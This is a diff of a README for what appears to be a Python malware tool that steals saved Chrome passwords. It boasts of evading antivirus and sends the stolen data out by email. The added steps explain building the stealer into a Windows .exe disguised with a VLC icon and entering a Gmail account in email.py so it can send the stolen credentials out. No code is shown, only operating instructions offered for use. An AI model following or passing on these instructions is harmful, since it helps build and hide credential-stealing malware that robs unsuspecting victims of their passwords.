@@ -5,14 +5,37 @@ Python steal chrome password all version are supported FUD 100 %
 
 receive data by email
 
+# Upate simple installation depandance
+
 # Dependencies
 
 download and install Python > 3.0
 
-https://www.python.org/ftp/python/3.7.1/python-3.7.1-amd64.exe
+https://www.python.org/ftp/python/3.7.0/python-3.7.0.exe
 
 
- after install Python,open your cmd and install Dependencies
+ after install Python
+ 
+ # fast installation dependances :
+ 
+ test steal password with local script
+ 
+ run " build_local.bat "
+ 
+ build_local.bat will download and install depandances after he will build your .exe with icon vlc
+ 
+ if it working
+ 
+ 
+open email.py 
+
+put your gmail email (and password ), email sender
+
+run  build_email.bat
+ 
+ # Manuel installation
+ 
+ open your cmd and install Dependencies
 
  pip install pywin32
 
@@ -27,12 +50,9 @@ pip install pyinstaller
 
 * to build with .exe ,run :
 
-pyinstaller password_stealer.py -F -w
+pyinstaller email.py -F -w
 
-
-password_stealer is your python file,you can change the name
-
-# demo Video Youtube
+# demo Video Youtube ( video deleted )
 
 https://www.youtube.com/watch?v=EGkzVcd26I8&feature=youtu.be
 
